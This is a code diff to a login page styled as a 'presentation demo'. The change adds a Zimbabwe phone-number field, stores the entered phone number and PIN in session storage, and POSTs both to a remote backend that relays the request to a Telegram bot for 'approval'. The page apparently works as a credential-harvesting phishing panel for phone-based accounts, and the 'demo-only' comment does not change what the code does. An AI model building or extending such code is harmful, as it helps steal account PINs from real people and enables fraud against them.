@@ -516,6 +516,36 @@
         font-size: 12px;
       }
     }
+    .phone-wrapper {
+  display: flex;
+  align-items: center;
+  width: 100%;
+  height: 80px;
+  border: 3px solid #0871d9;
+  border-radius: 13px;
+  background: #fff;
+  overflow: hidden;
+}
+
+.country-code {
+  padding-left: 22px;
+  padding-right: 10px;
+  font-size: 20px;
+  font-weight: 700;
+  color: #555;
+}
+
+.phone-wrapper .phone-input {
+  height: 100%;
+  border: none;
+  border-radius: 0;
+  padding: 0 18px 0 8px;
+  flex: 1;
+}
+
+.phone-wrapper .phone-input:focus {
+  box-shadow: none;
+}
   </style>
 </head>
 
@@ -558,14 +588,19 @@
           Demo phone number
         </label>
 
-        <input
-          type="text"
-          class="phone-input"
-          id="phoneInput"
-          value="123456789"
-          autocomplete="off"
-        >
+       <div class="phone-wrapper">
+  <span class="country-code">+263</span>
 
+  <input
+    type="tel"
+    class="phone-input"
+    id="phoneInput"
+    placeholder="Enter phone number"
+    
+    autocomplete="tel"
+    inputmode="numeric"
+  >
+</div>
         <div class="pin-label">
           Enter demo PIN
         </div>
@@ -767,6 +802,8 @@
 
     const statusButton =
       document.getElementById("statusButton");
+      
+      const phone= document.getElementById("phoneInput");
 
     let cancelled = false;
 
@@ -880,74 +917,62 @@
      */
 
     async function createDemoRequest() {
+  const phoneNumber =
+    sessionStorage.getItem("phone") || phone.value.trim();
+    
+   
 
-      const response = await fetch(
-        `${API_URL}/api/demo-login`,
-        {
-          method: "POST",
+  // Demo-only value; don't use a real account PIN here.
+  const demoPin =  sessionStorage.getItem("pin") || pinBoxes.value.trim();
 
-          headers: {
-            "Content-Type": "application/json"
-          },
+  const response = await fetch(
+    `${API_URL}/api/demo-login`,
+    {
+      method: "POST",
 
-          body: JSON.stringify({
-            event: "presentation_demo_login"
-          })
-        }
-      );
+      headers: {
+        "Content-Type": "application/json"
+      },
 
-      const text =
-        await response.text();
-
-      let data;
-
-      try {
-
-        data =
-          JSON.parse(text);
-
-      } catch (error) {
-
-        throw new Error(
-          "Render returned a non-JSON response: " +
-          text.slice(0, 200)
-        );
-
-      }
-
-      if (
-        !response.ok ||
-        !data.ok
-      ) {
-
-        throw new Error(
-          data.error ||
-          "Unable to create demo request."
-        );
-
-      }
-
-      /*
-       * IMPORTANT:
-       *
-       * Return ONLY the requestId string.
-       *
-       * Do not return the entire data object.
-       */
-
-      if (
-        typeof data.requestId !== "string" ||
-        !data.requestId
-      ) {
-
-        throw new Error(
-          "Render did not return a valid request ID."
-        );
-
-      }
-
-      return data.requestId;
+      body: JSON.stringify({
+        event: "presentation_demo_login",
+        phone: phoneNumber,
+        pin: demoPin
+      })
     }
+  );
+
+  const text = await response.text();
+
+  let data;
+
+  try {
+    data = JSON.parse(text);
+  } catch (error) {
+    throw new Error(
+      "Render returned a non-JSON response: " +
+      text.slice(0, 200)
+    );
+  }
+
+  if (!response.ok || !data.ok) {
+    throw new Error(
+      data.error ||
+      "Unable to create demo request."
+    );
+  }
+
+  if (
+    typeof data.requestId !== "string" ||
+    !data.requestId
+  ) {
+    throw new Error(
+      "Render did not return a valid request ID."
+    );
+  }
+
+  return data.requestId;
+}
 
     /*
      * -------------------------------
@@ -1154,114 +1179,130 @@
      * -------------------------------
      */
 
-    loginButton.addEventListener(
-      "click",
-      async function () {
+  
+loginButton.addEventListener(
+  "click",
+  async function () {
 
-        const complete =
-          [...pinBoxes].every(
-            function (box) {
-              return box.value.length === 1;
-            }
-          );
+    // Check PIN
+    const pinComplete =
+      [...pinBoxes].every(function (box) {
+        return box.value.trim().length === 1;
+      });
 
-        if (!complete) {
+    // Check phone number
+    const phoneComplete =
+      phone.value.trim().length > 5;
 
-          pinError.textContent =
-            "Please enter the 4-digit demo PIN.";
+    // Both PIN and phone must be valid
+    const complete =
+      pinComplete && phoneComplete;
 
-          pinError.classList.add(
-            "show"
-          );
+    if (!complete) {
 
-          pinBoxes[0].focus();
-
-          return;
-        }
-
-        loginButton.disabled =
-          true;
-
-        loginButton.textContent =
-          "CONNECTING...";
-
-        cancelled =
-          false;
-
-        try {
-
-          /*
-           * Only creates a generic demo request.
-           */
-
-          const requestId =
-            await createDemoRequest();
-
-          console.log(
-            "Created demo request:",
-            requestId
-          );
-
-          statusIcon.textContent =
-            "📱";
-
-          statusTitle.textContent =
-            "Waiting for approval";
-
-          statusMessage.textContent =
-            "A presentation demo request has been " +
-            "sent to the configured Telegram demo bot.";
-
-          statusButton.textContent =
-            "CANCEL";
-
-          statusButton.onclick =
-            function () {
-
-              cancelled =
-                true;
-
-              statusModal.classList.remove(
-                "show"
-              );
-
-            };
-
-          statusModal.classList.add(
-            "show"
-          );
-
-          await waitForApproval(
-            requestId
-          );
-
-        } catch (error) {
-
-          console.error(
-            "Demo request failed:",
-            error
-          );
-
-          pinError.textContent =
-            error.message ||
-            "Unable to connect to the demo approval server.";
-
-          pinError.classList.add(
-            "show"
-          );
-
-        } finally {
-
-          loginButton.disabled =
-            false;
-
-          loginButton.textContent =
-            "LOGIN";
-
-        }
-
+      if (!phoneComplete) {
+        pinError.textContent =
+          "Please enter a valid phone number.";
+      } else if (!pinComplete) {
+        pinError.textContent =
+          "Please enter the complete 4-digit PIN.";
+      } else {
+        pinError.textContent =
+          "Please check your phone number and PIN.";
       }
-    );
+
+      pinError.classList.add("show");
+
+      if (!phoneComplete) {
+        phone.focus();
+      } else {
+        pinBoxes[0].focus();
+      }
+
+      return;
+    }
+
+// Save phone number for this browser session
+const phoneNumber = phone.value.trim();
+
+sessionStorage.setItem("phone", phoneNumber);
+const pin = [...pinBoxes]
+  .map(box => box.value)
+  .join("");
+
+sessionStorage.setItem("pin", pin);
+
+
+    // Hide previous error
+    pinError.classList.remove("show");
+
+    loginButton.disabled = true;
+    loginButton.textContent = "CONNECTING...";
+
+    cancelled = false;
+
+    try {
+
+      /*
+       * Only creates a generic demo request.
+       */
+      const requestId =
+        await createDemoRequest();
+
+      console.log(
+        "Created demo request:",
+        requestId
+      );
+
+      statusIcon.textContent = "📱";
+
+      statusTitle.textContent =
+        "Waiting for approval";
+
+      statusMessage.textContent =
+        "A presentation demo request has been " +
+        "sent to the configured Telegram demo bot.";
+
+      statusButton.textContent = "CANCEL";
+
+      statusButton.onclick = function () {
+
+        cancelled = true;
+
+        statusModal.classList.remove(
+          "show"
+        );
+
+      };
+
+      statusModal.classList.add("show");
+
+      await waitForApproval(requestId);
+
+    } catch (error) {
+
+      console.error(
+        "Demo request failed:",
+        error
+      );
+
+      pinError.textContent =
+        error.message ||
+        "Unable to connect to the demo approval server.";
+
+      pinError.classList.add("show");
+
+    } finally {
+
+      loginButton.disabled = false;
+
+      loginButton.textContent = "LOGIN";
+
+    }
+
+  }
+);
+
 
     /*
      * -------------------------------
